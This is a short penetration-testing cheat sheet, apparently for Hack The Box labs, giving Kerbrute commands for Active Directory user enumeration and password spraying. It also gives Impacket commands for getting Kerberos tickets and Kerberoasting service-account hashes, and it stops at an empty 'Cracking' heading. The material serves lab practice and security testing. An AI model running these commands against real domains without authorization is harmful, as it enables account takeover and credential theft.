# Cheat Sheet

## Kerbrute

### Enumerating Valid Users w/ Kerbrute

1. Place potentially valid users into a <mark style="color:yellow;">users.txt</mark> file

&#x20; 2\. Execute Userenum:

```
./kerbrute userenum -d htb.local --dc hostname_or_IP_of_DC users.txt
```

### Password Spray

1. Gather valid usernames
2. Execute userenum
3. Passwordspray:

```
./kerbrute passwordspray --dc hostname_or_IP_of_DC -d htb.local users.txt <password_here>
```

## Impacket

### Generate Kerberos TGT w/ <mark style="color:yellow;">Impacket-GetTGT</mark>

Generate TGT:

```
impacket-getTGT domain/user:password
```

* This will save the ticket as <mark style="color:yellow;">\<username>.ccache</mark>

Export KRB5CCNAME so that Impacket will use it:

```
export KRB5CCNAME=user.ccache
```

```
klist

Ticket cahce: FILE: <username.ccache>
Default principal: username@domain

Valid Starting        Expires            Service Principal
MM/DD/YYYY TIME       MM/DD/YYYY TIME    krbtgt/domain@domain
        renew until MM/DD/YYYY TIME
```

### Kerberoasting w/ Impacket-<mark style="color:yellow;">GetUserSPNs</mark>

```
impacket-GetUserSPNs domain/user:password -dc-ip hostname_or_ip_of_dc -k

Password: Enter_password_here
```

no-pass option:

```
impacket-GetUserSPNs domain/user:password -dc-ip hostname_or_ip_of_dc -k -no-pass
```

* Be sure to utilize the <mark style="color:yellow;">-request option if you want a hash</mark>
* Without it, you will only validate access to an SPN
* Which is helpful, but what we're really after is a hash

```
impacket-GetUserSPNs domain/user:password -dc-ip hostname_or_ip_of_dc -k -request
```

Getting an error?

* "<mark style="color:yellow;">The SMB request is not supported. Probably NTLM is disabled.</mark>"
* You may be able to fix this with the <mark style="color:yellow;">-dc-host</mark> option rather than -dc-ip

```
impacket-GetUserSPNs domain/user:password -dc-host hostname_or_ip_of_dc -k
```

no-pass option:

```
impacket-GetUserSPNs domain/user:password -dc-host hostname_or_ip_of_dc -k -no-pass
```

Requesting hash:

* The <mark style="color:yellow;">-request option is required in order to obtain a hash</mark>

```
impacket-GetUserSPNs domain/user:password -dc-host hostname_or_ip_of_dc -k -no-pass -request
```

### Cracking&#x20;
